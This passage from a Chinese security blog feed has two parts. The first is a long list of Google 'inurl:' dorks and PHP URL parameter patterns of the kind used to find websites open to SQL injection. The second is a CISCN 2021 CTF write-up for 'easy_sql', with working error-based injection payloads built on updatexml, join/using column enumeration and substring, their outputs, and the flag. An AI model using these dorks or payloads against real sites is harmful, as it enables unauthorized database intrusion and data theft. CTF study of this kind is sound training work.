<li><input disabled="" type="checkbox"> <p>modules/forum/index.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feature.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/Blitzball.htm?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile_print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>questions.php?questionid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>html/scoutnew.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main/index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?type=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewthread.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>summary.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/latest_news.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>specials.php?osCsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>search/display.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>articles.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsite/pdf_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/category.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcafe-shop-product.php?bookId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/books_detail.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/books_detail.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog.php?blog=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodotti.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>poem_list.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?categoryId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>authorDetails.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>press_release.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>colourpointeducational/more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>download.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/category.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>i-know/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/index.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pageId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>onlinesales/product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>garden_equipment/Fruit-Cage/product.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showsub.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?fid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?sku=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_detail.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?categoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>message/comment_threads.php?postID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>artist_art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?option=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ov_tv.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cps/rde/xchg/tm/hs.xsl/liens_detail.html?lnkId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_show.php?lid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pagerequested=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>books.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?offs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mboard/replies.php?parent_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Computer Science.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdf_post.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>reviews.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prod.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event_info.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_book.php?CAT=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>schule/termine.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goods_detail.php?data=</p>
</li>
<li><input disabled="" type="checkbox"> <p>wiki/pmwiki.php?page*=</p>
</li>
<li><input disabled="" type="checkbox"> <p>summary.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?grpid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>db/CART/product_details.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ProductList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_ranges_view.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cei/cedb/projdetail.php?projID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?DepartmentID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?news=</p>
</li>
<li><input disabled="" type="checkbox"> <p>education/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Interior/productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storemanager/contents/item.php?page_code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customer/board.htm?mode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help/com_view.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>n_replyboard.php?typeboard=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng_board/view.php?T****=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prev_results.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gnu/?doc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zb/view.php?uid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global/product/product.php?gubun=</p>
</li>
<li><input disabled="" type="checkbox"> <p>m_view.php?ps_db=</p>
</li>
<li><input disabled="" type="checkbox"> <p>naboard/memo.php?bd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookmark/mybook/bookmark.php?bookPageNo=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/board.html?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>kboard/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.asp?lotid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/board/view****.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goboard/front/board_view.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/bbsView.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>boardView.php?bbs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng/rgboard/view.php?&amp;bbs_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?cate=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?module=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> </li>
<li><input disabled="" type="checkbox"> <p>二.</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:item_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:review.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:hosting_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:iniziativa.php?in=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:trainers.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:curriculum.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news-full.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:labels.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view_faq.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news_display.php?getid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:story.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:artikelinfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index2.php?option=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:look.php?ID=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:readnews.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:top10.php?cat=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:profile_view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:material.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:event.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:opinions.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product-item.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:fellows.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sql.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:downloads_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?catid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:galeri_info.php?l=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:prod_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?catid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:tekst.php?idt=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shop.php?do=part&amp;id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newscat.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productinfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsticker_info.php?idn=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:collectionitem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rubrika.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:band_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:trainers.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rubp.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:buy.php?category=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:offer.php?idf=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:releases.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?ID=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:art.php?idm=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:ray.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:play_old.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:title.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:produit.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:declaration_more.php?decl_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news_view.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pop.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pageid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:select_biblio.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shopping.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:games.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:humor.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productdetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:page.php?file=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:post.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsDetail.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:ogl_inet.php?ogl_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewshowdetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:gallery.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:fiche_spectacle.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clubpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:communique_detail.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:memberInfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:show.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sem.php3?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:section.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:staff_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:kategorie.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:theme.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsitem.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:readnews.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shredder-categories.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:top10.php?cat=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:faq2.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:tradeCategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:historialeer.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:show_an.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product_ranges_view.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:reagir.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:preview.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shop_category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:Stray-Questions-View.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:loadpsb.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:transcript.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:forum_bds.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:opinions.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:channel_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:game.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:spr.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view_product.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pages.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:preview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:loadpsb.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sw_comment.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clanek.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:participant.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:avd_start.php?avd=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:download.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:event.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:main.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product-item.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:review.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sql.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:chappies.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:material.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:read.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clanek.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:prod_detail.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewphoto.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:chappies.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:read.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:person.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewapp.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productinfo.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewphoto.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:showimg.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:galeri_info.php?l=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:website.php?id=</p>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>谷歌语法</tag>
      </tags>
  </entry>
  <entry>
    <title>第十四届全国大学生CTF比赛</title>
    <url>/2021/05/15/%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9FCTF%E6%AF%94%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><blockquote>
<p>1、通过报错注入获取flag的字段名id</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b)c)),0x2e)#</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>2、通过的方式获取flag的字段名no</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b using(id))c)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>3、在获取id及之后字段名no字段名’b803ed64-14a9-474f-9832-b854b23d3014’</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b using(id,no))c)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>4、通过字段名获取flag的一部分</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">需要将单引号该成反引号</span><br><span class="line">&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select &#96;b803ed64-14a9-474f-9832-b854b23d3014&#96; from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>5、通过substring(str,10,20)这个函数进行后半部分显示</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select substring(&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;,10,20) from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;eE-peOfv-Wemp4-GE5FV&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>5、通过substring(str,20,30)这个函数进行后半部分显示</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select substring(&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;,20,30) from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;emp4-GE5FV-51yUy-&#125;&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>6、删除重复部分</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">第一部分</span><br><span class="line">TH syntax error: &#39;CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51&#39;</span><br><span class="line">第二部分</span><br><span class="line">TH syntax error: &#39;eE-peOfv-Wemp4-GE5FV&#39;</span><br><span class="line">第三部分</span><br><span class="line">TH syntax error: &#39;emp4-GE5FV-51yUy-&#125;&#39;</span><br><span class="line"></span><br><span class="line">删除重复部分</span><br><span class="line">得出答案</span><br><span class="line">CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51yUy-&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CISCN</category>
      </categories>
